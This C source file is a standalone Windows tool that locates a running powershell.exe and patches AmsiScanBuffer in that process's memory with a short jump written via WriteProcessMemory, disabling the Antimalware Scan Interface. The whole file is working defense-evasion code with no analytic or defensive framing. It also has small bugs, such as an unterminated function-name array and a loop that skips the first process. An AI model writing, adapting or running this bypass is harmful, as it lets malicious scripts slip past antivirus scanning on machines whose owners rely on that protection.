#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "memoryapi.h"
#include "winnt.h"

DWORD FindProc(char* name)
{
    //Creating a handle for the snapshot processes
  HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // The TH32CS_SNAPPROCESS includes all the processes in the system
  if (hSnapshot == INVALID_HANDLE_VALUE)
  {
    printf("Failed creating Snapshot\n");
    return -1; // Creating a snapshot failed
  }

  PROCESSENTRY32 procEntry; // This is the snapshot object
  procEntry.dwSize = sizeof(procEntry);

  BOOL res = Process32First(hSnapshot, &procEntry);

  if (res == FALSE)
  {
    printf("Grabbing the first process snapshot failed\n");
    return -1;
  }

  // Cycle through all the process snapshots until there is none to view
  for(procEntry; Process32Next(hSnapshot, &procEntry) != NULL;)
  {
    if(strcmp(procEntry.szExeFile, name) == 0)
    {
      CloseHandle(hSnapshot);
      return procEntry.th32ProcessID;
    }
  }

  // Cleanup
  CloseHandle(hSnapshot);
  return 0;
}

int main()
{
  unsigned char amsiName[] = {'A', 'm', 's', 'i', 'S', 'c', 'a', 'n', 'B', 'u', 'f', 'f', 'e', 'r'};

  PDWORD amsiScanbuffer_p = (PDWORD)GetProcAddress(LoadLibrary("amsi.dll"), amsiName);

  unsigned char bytes[] = {0xeb, 0x4c};
  SIZE_T write;
  DWORD pid = FindProc("powershell.exe");
  HANDLE ProcHandle = NULL;
  if (pid != 0)
  {
      ProcHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  }
  else
  {
      printf("Error1: %d\n", GetLastError());
      return -1;
  }
  DWORD oldprotect;
  BOOL res = VirtualProtectEx(ProcHandle, ((PBYTE)amsiScanbuffer_p + 0x59), sizeof(bytes)*10, PAGE_READWRITE, &oldprotect);
  printf("Address: %p\n", ((PBYTE)amsiScanbuffer_p+0x59));
  WriteProcessMemory(ProcHandle, ((PBYTE)amsiScanbuffer_p + 0x59), bytes, sizeof(bytes), &write);
  printf("Error3 : %p\n", GetLastError());
  printf("Bytes written: %d\n", write);
  res = VirtualProtectEx(ProcHandle, ((PBYTE)amsiScanbuffer_p + 0x59), sizeof(bytes) * 10, oldprotect, &oldprotect);
  printf("Res: %d\n", res);
  getchar();

  return 0;
}
